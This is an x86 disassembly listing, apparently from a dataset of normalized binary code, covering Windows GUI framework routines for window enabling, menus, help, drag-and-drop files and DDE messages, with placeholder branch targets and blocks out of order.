mov edi [ SendMessageA@IAT ]
push ecx
push 0x365
push [ esi + 0x1c ]
call edi
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
push eax
push ebx
push 0x111
push [ esi + 0x1c ]
call edi
pop edi
pop esi
pop ebx
retn 0x8
sub_44f628
mov eax [ esp + 0x8 ]
push 0x1
pop eax
jmp r-xdata
push eax
call sub_43fd39
test eax eax
je r-xdata
retn 0x8
xor eax eax
jmp r-xdata
cmp [ esp + 0x4 ] eax
je r-xdata
sub_44f648
push ecx
push ebx
mov ebx ecx
push ebp
push esi
inc [ ebx + 0xa0 ]
cmp [ ebx + 0xa0 ] 0x1
lea eax [ ebx + 0xa0 ]
push edi
ja r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
call sub_43fd7e
push 0x5
mov [ esp + 0x14 ] eax
xor ebp ebp
call [ GetDesktopWindow@IAT ]
mov edi [ GetWindow@IAT ]
push eax
call edi
mov esi eax
test esi esi
je r-xdata
push esi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
push 0x2
push esi
call edi
mov esi eax
test esi esi
jne r-xdata
push esi
call sub_43e7da
test eax eax
je r-xdata
test ebp ebp
je r-xdata
mov eax [ esp + 0x10 ]
push esi
push [ eax + 0x1c ]
call sub_44f628
test eax eax
je r-xdata
lea eax [ ebp * 4 + 0x4 ]
push eax
call sub_441e89
pop ecx
mov [ ebx + 0xa4 ] eax
push 0x5
xor ebp ebp
call [ GetDesktopWindow@IAT ]
push eax
push 0x0
push 0x0
push 0x36c
push esi
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0xa4 ]
and [ eax + ebp * 4 ] 0x0
push esi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
inc ebp
push 0x2
push esi
jmp r-xdata
push esi
call sub_43e7da
test eax eax
je r-xdata
call edi
mov esi eax
test esi esi
je r-xdata
mov eax [ esp + 0x10 ]
push esi
push [ eax + 0x1c ]
call sub_44f628
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x36c
push esi
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
push eax
push esi
call [ EnableWindow@IAT ]
mov eax [ ebx + 0xa4 ]
mov [ eax + ebp * 4 ] esi
inc ebp
sub_44f764
push esi
mov esi ecx
mov ecx [ esi + 0xa0 ]
lea eax [ esi + 0xa0 ]
test ecx ecx
je r-xdata
pop esi
retn
dec ecx
test ecx ecx
mov [ eax ] ecx
ja r-xdata
mov eax [ esi + 0xa4 ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push [ esi + 0xa4 ]
call sub_441eb2
and [ esi + 0xa4 ] 0x0
pop ecx
push edi
xor edi edi
mov eax [ esi + 0xa4 ]
add edi 0x4
cmp [ edi + eax ] 0x0
jne r-xdata
mov eax [ esi + 0xa4 ]
push 0x1
push [ eax + edi ]
call [ EnableWindow@IAT ]
push [ edi + eax ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
pop edi
sub_44f7d3
push ecx
push ebp
push esi
mov [ esp + 0x8 ] ecx
push 0x5
call [ GetDesktopWindow@IAT ]
mov ebp [ GetWindow@IAT ]
push eax
call ebp
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
pop ecx
retn 0x4
push ebx
mov ebx [ ShowWindow@IAT ]
push edi
push 0x2
push esi
call ebp
mov esi eax
test esi esi
jne r-xdata
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x1c ]
cmp eax esi
je r-xdata
push esi
call sub_43e7da
mov edi eax
test edi edi
je r-xdata
pop edi
pop ebx
push esi
push eax
call sub_44f628
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
cmp [ esp + 0x18 ] 0x0
jne r-xdata
test eax 0x18000000
jne r-xdata
and eax 0x18000000
cmp eax 0x10000000
jne r-xdata
test [ edi + 0x24 ] 0x2
je r-xdata
push 0x0
push esi
call ebx
or [ edi + 0x24 ] 0x2
jmp r-xdata
push 0x4
push esi
call ebx
and [ edi + 0x24 ] 0xfffffffd
sub_44f86b
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
xor ebx ebx
mov esi ecx
cmp edi ebx
je r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
test eax eax
jne r-xdata
test [ esi + 0x24 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
retn 0x4
cmp edi ebx
jne r-xdata
push ebx
call sub_441841
push ebx
call [ SetFocus@IAT ]
jmp r-xdata
mov eax [ esi + 0x24 ]
mov ebx [ SendMessageA@IAT ]
test al 0x80
push ebp
je r-xdata
cmp [ esi + 0xa0 ] ebx
jne r-xdata
test [ esi + 0x24 ] 0x20
pop ebp
je r-xdata
and al 0x7f
mov ecx esi
mov [ esi + 0x24 ] eax
mov eax [ esi ]
call [ eax + 0x8c ]
mov ebp [ esi + 0x1c ]
call [ GetActiveWindow@IAT ]
cmp eax ebp
jne r-xdata
neg edi
sbb edi edi
mov ecx esi
and edi 0xfffffff0
add edi 0x20
push edi
call sub_44f921
mov eax [ esi ]
or [ esi + 0x24 ] 0x80
mov ecx esi
call [ eax + 0x88 ]
jmp r-xdata
push 0x0
push 0x1
push 0x86
push [ esi + 0x1c ]
call ebx
push 0x0
push 0x1
push 0x6
push ebp
call ebx
sub_44f921
push ebx
push ebp
push esi
push edi
mov esi ecx
call sub_44163f
test eax 0x40000000
je r-xdata
mov ecx esi
call sub_43fe5b
mov edi eax
mov edi esi
jmp r-xdata
push 0x5
call [ GetDesktopWindow@IAT ]
mov ebx [ GetWindow@IAT ]
push eax
mov ecx edi
call sub_441826
mov ecx [ esp + 0x14 ]
not ecx
test cl 0x8
je r-xdata
test [ esp + 0x14 ] 0xc
mov ebp [ SendMessageA@IAT ]
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
push esi
push [ edi + 0x1c ]
call sub_44f628
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x86
push [ edi + 0x1c ]
call ebp
test eax eax
je r-xdata
push 0x2
push esi
jmp r-xdata
push 0x0
push [ esp + 0x18 ]
push 0x36d
push esi
call ebp
cmp edi esi
je r-xdata
call ebx
mov esi eax
test esi esi
je r-xdata
or [ esi + 0x25 ] 0x2
push 0x0
push 0x1
push 0x86
push [ edi + 0x1c ]
call ebp
and [ esi + 0x25 ] 0xfd
jmp r-xdata
sub_44f9cb
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test ah 0x80
je r-xdata
push 0x8
call sub_44121e
mov [ esi + 0x28 ] r--data
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x1
pop eax
pop esi
retn 0x4
or [ esi + 0x2d ] 0x2
or ah 0x40
mov [ esi + 0x20 ] eax
sub_44fa0f
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
xor ebx ebx
cmp [ ebp + 0x1c ] edi
mov esi ecx
je r-xdata
push [ ebp + 0xc ]
lea ecx [ esi + 0xac ]
call sub_4422d1
mov eax [ ebp + 0x18 ]
cmp eax edi
je r-xdata
call sub_45357b
push [ ebp + 0x1c ]
mov eax [ eax + 0xc ]
push eax
call [ LoadMenuA@IAT ]
mov ebx eax
cmp ebx edi
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ebx
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi ecx
sub eax edx
push edi
push eax
push ecx
push edx
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x20 ]
call sub_43ed0f
test eax eax
jne r-xdata
mov edi [ eax + 0x1c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
jmp r-xdata
push 0x1
pop eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call [ DestroyMenu@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x20
sub_44faa7
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
push esi
mov ecx [ ebx ]
push edi
call sub_442eec
mov edi eax
xor esi esi
cmp edi esi
je r-xdata
xor eax eax
jmp r-xdata
push ebx
mov eax [ edi ]
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] esi
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
push ecx
push 0x50800000
push esi
push esi
mov ecx edi
call [ eax + 0x54 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ rw-data ] esi
je r-xdata
mov eax edi
mov ecx edi
call sub_441659
mov ecx 0x200
test ecx eax
je r-xdata
push 0x20
push esi
push ecx
mov ecx [ ebp - 0x4 ]
call sub_4416a4
sub_44fb1f
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0x0
je r-xdata
push 0xe900
push eax
call sub_44faa7
test eax eax
je r-xdata
retn 0x8
sub_44fb50
push esi
mov esi ecx
call sub_43e71a
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
push [ esp + 0xc ]
mov eax [ esi ]
mov ecx esi
push [ esp + 0xc ]
call [ eax + 0xdc ]
test eax eax
jne r-xdata
pop esi
retn 0x8
push 0x0
push 0xe001
push 0x362
push [ esi + 0x1c ]
call [ PostMessageA@IAT ]
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0xc8 ]
xor eax eax
sub_44fb9f
push ebp
mov ebp esp
sub esp 0x58
push esi
push edi
mov esi ecx
call sub_45357b
movzx ecx [ ebp + 0xc ]
mov eax [ eax + 0xc ]
push ecx
push eax
call [ LoadIconA@IAT ]
mov edi eax
test edi edi
je r-xdata
xor eax eax
push 0x30
lea eax [ ebp - 0x58 ]
push 0x0
push eax
call sub_42dc30
mov eax [ ebp + 0x8 ]
add esp 0xc
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x38 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
cmp [ ebp - 0x30 ] 0x0
je r-xdata
call sub_45357b
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x28 ]
push ecx
push [ ebp - 0x30 ]
push eax
call [ GetClassInfoA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x28 ]
call sub_43f3f3
jmp r-xdata
pop edi
pop esi
leave
retn 0x8
sub_44fc22
mov eax sub_46372c
call sub_42dc88
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x8c ] edi
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor ebx ebx
push edi
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
call sub_4437c6
test eax eax
je r-xdata
push 0x8
call sub_44121e
push edi
mov ecx esi
push [ ebp + 0xc ]
call sub_44fb9f
push [ ebp + 0x14 ]
mov ecx [ esi + 0xac ]
movzx edi di
push ebx
push edi
push [ ebp + 0x10 ]
push rw-data
push [ ebp + 0xc ]
push ecx
push eax
mov ecx esi
call sub_44fa0f
test eax eax
je r-xdata
push 0xa
push ebx
push [ ebp + 0x8 ]
lea eax [ esi + 0xac ]
push eax
call sub_443871
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
mov eax ebx
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
push [ esi + 0x1c ]
call [ GetMenu@IAT ]
push edi
mov ecx esi
mov [ esi + 0x44 ] eax
call sub_44f3a4
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push 0x1
pop ebx
push 0x1
push 0x1
push ebx
push ebx
push 0x364
push [ esi + 0x1c ]
call sub_43ff47
sub_44fcec
mov eax [ esp + 0x4 ]
push esi
test eax eax
mov esi ecx
jne r-xdata
push eax
push [ esi + 0x1c ]
call [ SetMenu@IAT ]
pop esi
retn 0x4
mov eax [ esi ]
call [ eax + 0xbc ]
test eax eax
je r-xdata
mov eax [ esi + 0x44 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0xa4 ]
test eax eax
jne r-xdata
sub_44fd22
push ebx
push esi
push edi
mov esi ecx
xor edi edi
call sub_4504c3
test eax eax
jne r-xdata
xor ebx ebx
cmp [ esp + 0x14 ] ebx
je r-xdata
push 0x1
push 0xe900
push [ esi + 0x1c ]
call sub_43fece
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
push 0x1
push 0x1
push ebx
push ebx
push 0x364
push [ esi + 0x1c ]
call sub_43ff47
cmp edi ebx
je r-xdata
push r--data
mov ecx ebx
call sub_442eba
test eax eax
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0xe0 ]
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ ecx ]
call [ eax + 0xa0 ]
or ebx 0xffffffff
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi ]
push esi
push ebx
mov ecx edi
call [ eax + 0xe8 ]
push 0x0
push ebx
mov ecx esi
mov edi ebx
call sub_4504ca
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0xcc ]
test edi edi
je r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
mov eax [ edi ]
push edi
push edi
push 0x1
mov ecx edi
call [ eax + 0xe4 ]
mov ebx [ eax + 0x74 ]
or [ eax + 0x74 ] 0xffffffff
sub_44fde8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx ecx
push esi
push edi
mov eax [ ebx + 0x9c ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0xbc ]
mov esi eax
test esi esi
je r-xdata
push ebx
call eax
test eax eax
je r-xdata
call sub_45357b
mov edi [ eax + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x8c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
test esi esi
je r-xdata
cmp [ edi + 0x1c ] ebx
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x58 ]
cmp [ esi + 0x48 ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x60 ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx edi
call sub_44ab2e
push 0x0
mov ecx edi
call sub_44abfa
call sub_451740
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x88 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x7c ]
jmp r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx esi
call [ eax + 0x64 ]
mov ecx eax
call sub_43fcfb
cmp eax ebx
jne r-xdata
call sub_45357b
cmp [ eax + 0x14 ] 0x0
jne r-xdata
push eax
call sub_451750
jmp r-xdata
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x94 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ edi + 0x1c ] 0x0
jne r-xdata
push 0x0
call sub_45b297
jmp r-xdata
sub_44fedf
push esi
push edi
mov esi ecx
call sub_450a84
cmp [ esi + 0x44 ] 0x0
je r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push [ esi + 0x1c ]
mov edi [ esi + 0x44 ]
call [ GetMenu@IAT ]
cmp eax edi
je r-xdata
mov ecx esi
call sub_43eebd
pop edi
pop esi
retn
cmp [ eax + 0x1c ] esi
jne r-xdata
push edi
push [ esi + 0x1c ]
call [ SetMenu@IAT ]
push 0x0
push 0x2
push 0x0
push [ esi + 0x1c ]
call [ WinHelpA@IAT ]
sub_44ff32
push esi
push 0x0
push [ esp + 0xc ]
lea esi [ ecx + 0x6c ]
mov ecx esi
call sub_43cf74
test eax eax
je r-xdata
pop esi
retn 0x4
push eax
mov ecx esi
call sub_43cf3d
sub_44ff53
mov eax sub_463740
call sub_42dc88
push ecx
push ecx
push ebx
push esi
push edi
mov edi ecx
call sub_453349
mov esi eax
mov [ ebp - 0x10 ] esi
mov ebx [ esi + 0xc4 ]
mov [ esi + 0xc4 ] edi
mov [ ebp - 0x14 ] ebx
and [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_4504c3
test eax eax
je r-xdata
push [ ebp + 0x14 ]
mov ecx edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_441aa8
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0xc ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ esi + 0xc4 ] ebx
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
xor eax eax
push [ ebp + 0x14 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0xc ]
test eax eax
jne r-xdata
sub_44fffb
push esi
call sub_4504c3
mov esi eax
test esi esi
je r-xdata
pop esi
retn 0xc
call sub_43e6e5
push [ eax + 0xc ]
push [ eax + 0x8 ]
push 0x114
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
sub_450024
push esi
call sub_4504c3
mov esi eax
test esi esi
je r-xdata
pop esi
retn 0xc
call sub_43e6e5
push [ eax + 0xc ]
push [ eax + 0x8 ]
push 0x115
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
sub_45004d
push esi
push edi
push [ esp + 0x10 ]
mov edi [ esp + 0x10 ]
mov esi ecx
push edi
call sub_440792
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf0 ]
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
call sub_4428ff
cmp [ eax + 0x1c ] esi
jne r-xdata
test di di
je r-xdata
push 0x0
push 0x0
push 0x36a
push [ esi + 0x1c ]
call [ PostMessageA@IAT ]
pop edi
xor eax eax
pop esi
retn 0x8
mov ecx esi
call sub_4504c3
test eax eax
jne r-xdata
xor eax eax
shr edi 0x10
test di di
jne r-xdata
mov edx [ eax ]
push eax
push eax
push 0x0
mov ecx eax
call [ edx + 0xe4 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0xc0 ]
mov ecx eax
call sub_4504c3
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ ecx ]
push eax
call [ edx + 0x58 ]
sub_4500db
push ebp
mov ebp esp
push ebx
push esi
mov ebx ecx
call sub_43e71a
mov ecx ebx
call sub_44163f
test eax 0x40000000
je r-xdata
mov ecx ebx
call sub_43fe5b
mov esi eax
mov esi ebx
jmp r-xdata
cmp esi edi
je r-xdata
mov edi ebx
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
push 0x1
pop eax
mov ecx edi
call sub_43fe5b
cmp esi eax
jne r-xdata
neg eax
sbb eax eax
mov ecx ebx
and al 0xfc
add eax 0x8
push eax
call sub_44f921
mov ecx ebx
call sub_4504c3
mov esi eax
test esi esi
jne r-xdata
or ecx 0x20
mov [ esi + 0x24 ] ecx
xor eax eax
jmp r-xdata
push 0x0
push 0x40
push 0x36d
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0xc0 ]
mov ecx eax
call sub_4504c3
mov esi eax
test esi esi
je r-xdata
and [ esi + 0x24 ] 0xffffffdf
mov ecx [ esi + 0x24 ]
test eax eax
pop edi
je r-xdata
mov eax [ esi ]
push ebx
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0xe8 ]
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
push esi
push esi
push 0x1
mov ecx esi
call [ eax + 0xe4 ]
sub_4501af
push esi
mov esi ecx
push edi
test [ esi + 0x24 ] 0x20
je r-xdata
mov edi [ esp + 0xc ]
push 0x1
pop edi
jmp r-xdata
mov eax [ esi ]
push 0x0
push edi
push 0x86
mov ecx esi
call [ eax + 0xa0 ]
pop edi
pop esi
retn 0x4
xor edi edi
mov ecx esi
call sub_441826
test eax eax
jne r-xdata
sub_4501e6
push esi
push edi
mov edi ecx
call sub_43fe5b
mov ecx [ esp + 0xc ]
and ecx 0xfff0
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov ecx edi
call sub_43e71a
mov eax 0xf040
cmp ecx eax
ja r-xdata
mov eax ecx
sub eax 0xf050
je r-xdata
je r-xdata
add ecx 0xffff1000
mov esi [ SendMessageA@IAT ]
shr ecx 0x4
add ecx 0x1ef00
push ecx
push 0x0
push 0x365
push [ edi + 0x1c ]
call esi
test eax eax
jne r-xdata
sub eax 0x10
je r-xdata
mov eax ecx
sub eax 0xf000
je r-xdata
pop edi
pop esi
retn 0x8
push eax
push 0xe147
push 0x111
push [ edi + 0x1c ]
call esi
jmp r-xdata
sub eax 0xc0
sub eax 0x10
je r-xdata
sub eax 0x10
jne r-xdata
sub eax 0x10
jmp r-xdata
je r-xdata
sub_45027b
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
push edi
push [ ecx + 0x1c ]
call [ SetActiveWindow@IAT ]
push eax
call sub_43e7b3
mov esi [ DragQueryFileA@IAT ]
xor ebx ebx
push ebx
push ebx
push 0xffffffff
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x4 ] eax
call sub_45357b
cmp [ ebp - 0x4 ] ebx
mov edi [ eax + 0x4 ]
jbe r-xdata
push [ ebp + 0x8 ]
call [ DragFinish@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x108 ]
push 0x104
push eax
push ebx
push [ ebp + 0x8 ]
call esi
mov eax [ edi ]
lea ecx [ ebp - 0x108 ]
push ecx
mov ecx edi
call [ eax + 0x7c ]
inc ebx
cmp ebx [ ebp - 0x4 ]
jb r-xdata
sub_4502ed
push esi
mov esi ecx
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
pop esi
retn
cmp [ eax + 0x1c ] esi
jne r-xdata
mov edx [ eax ]
mov ecx eax
call [ edx + 0x88 ]
pop esi
retn
sub_450312
cmp [ esp + 0x4 ] 0x0
push esi
push edi
mov edi ecx
je r-xdata
pop edi
pop esi
retn 0x4
call sub_45357b
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x1
call sub_451750
push 0x1
mov ecx esi
call sub_44abfa
mov eax [ esi ]
mov ecx esi
call [ eax + 0x68 ]
sub_45034a
push ebp
mov ebp esp
sub esp 0x108
push esi
mov [ ebp - 0x4 ] ecx
call sub_45357b
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor eax eax
pop esi
leave
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
shr ecx 0x10
test cx cx
je r-xdata
mov ax [ esi + 0xb0 ]
cmp [ ebp + 0xc ] ax
jne r-xdata
cmp cx [ esi + 0xb2 ]
jne r-xdata
push ebx
push edi
mov edi [ GlobalGetAtomNameA@IAT ]
lea ecx [ ebp - 0x108 ]
push 0x103
push ecx
push eax
call edi
mov ebx [ GlobalAddAtomA@IAT ]
lea eax [ ebp - 0x108 ]
push eax
call ebx
lea eax [ ebp - 0x108 ]
push 0x103
push eax
mov ax [ esi + 0xb2 ]
push eax
call edi
lea eax [ ebp - 0x108 ]
push eax
call ebx
movzx eax [ esi + 0xb2 ]
movzx ecx [ esi + 0xb0 ]
shl eax 0x10
or eax ecx
push eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x1c ]
push 0x3e4
push [ ebp + 0x8 ]
call [ SendMessageA@IAT ]
pop edi
pop ebx
sub_45040d
push ebp
mov ebp esp
sub esp 0x210
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
lea eax [ ebp - 0x8 ]
push eax
mov edi 0x3e8
push [ ebp + 0xc ]
mov ebx ecx
push edi
call UnpackDDElParam
push [ ebp - 0x4 ]
call [ GlobalLock@IAT ]
push 0x208
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpynA@IAT ]
push [ ebp - 0x4 ]
call [ GlobalUnlock@IAT ]
push [ ebp - 0x4 ]
mov esi 0x3e4
push 0x8000
push esi
push edi
push [ ebp + 0xc ]
call ReuseDDElParam
push eax
push [ ebx + 0x1c ]
push esi
push [ ebp + 0x8 ]
call [ PostMessageA@IAT ]
mov ecx ebx
call sub_441826
pop edi
pop esi
test eax eax
pop ebx
je r-xdata
xor eax eax
leave
retn 0x8
call sub_45357b
mov eax [ eax + 0x4 ]
lea ecx [ ebp - 0x210 ]
push ecx
mov ecx eax
mov edx [ eax ]
call [ edx + 0x94 ]
sub_4504ca
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x98 ]
cmp ebx edi
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
and [ esi + 0x98 ] 0x0
test edi edi
je r-xdata
cmp [ esi + 0x98 ] 0x0
jne r-xdata
mov eax [ edi ]
push edi
push ebx
push 0x0
mov ecx edi
call [ eax + 0xe4 ]
test ebx ebx
mov [ esi + 0x98 ] ebx
je r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
push edi
push ebx
push 0x1
mov ecx ebx
call [ eax + 0xe4 ]
sub_45054f
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx edi
call sub_4513b8
xor ebx ebx
mov esi eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx edi
neg eax
sbb eax eax
and al 0xc0
add eax 0x80
or al 0x17
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4417b0
mov eax [ edi ]
push [ ebp + 0xc ]
mov ecx edi
call [ eax + 0xc4 ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ edi ]
push [ ebp + 0xc ]
mov ecx edi
call [ eax + 0xc4 ]
or [ esi + 0xb8 ] 0xc
jmp r-xdata
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0xc8 ]
mov ecx edi
call sub_4513c9
test eax eax
jne r-xdata
mov ecx edi
call sub_4513c9
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ edi + 0x70 ]
cmp ecx ebx
je r-xdata
xor eax eax
cmp [ ebp + 0xc ] ebx
setne al
mov eax [ ecx ]
call [ eax + 0xe0 ]
jmp r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
or [ esi + 0x88 ] 0xffffffff
cmp [ ebp + 0x10 ] ebx
lea eax [ esi + 0x88 ]
je r-xdata
or [ esi + 0x88 ] 0xffffffff
cmp [ ebp + 0x10 ] ebx
lea eax [ esi + 0x88 ]
je r-xdata
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0xc8 ]
push ebx
jmp r-xdata
mov [ eax ] ebx
jmp r-xdata
push 0x8
mov [ eax ] 0x8
jmp r-xdata
mov ecx esi
call sub_4417ff
jmp r-xdata
sub_450668
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
mov ebx ecx
push edi
mov [ ebp - 0x4 ] ebx
push [ ebx + 0x1c ]
call sub_447a04
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ebx + 0x68 ]
mov esi [ ebp + 0x8 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x2c ]
call sub_441c49
mov [ ebp - 0x20 ] esi
call sub_453349
mov eax [ eax + 0x54 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x0
push [ ebp + 0xc ]
push esi
call [ eax + 0x74 ]
test eax eax
jne r-xdata
push [ ebx + 0x1c ]
mov edi [ GetMenu@IAT ]
call edi
test eax eax
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0xc ] eax
test eax eax
jbe r-xdata
mov ecx ebx
call sub_43fd7e
test eax eax
je r-xdata
mov edi [ GetMenuItemID@IAT ]
push [ eax + 0x1c ]
call edi
mov edi eax
test edi edi
je r-xdata
inc [ ebp - 0x24 ]
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0xc ]
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
push edi
call [ GetMenuItemCount@IAT ]
xor ebx ebx
mov [ ebp + 0x10 ] eax
test eax eax
jle r-xdata
push [ ebp - 0x24 ]
push [ esi + 0x4 ]
call edi
test eax eax
mov [ ebp - 0x28 ] eax
je r-xdata
and [ ebp - 0x1c ] 0x0
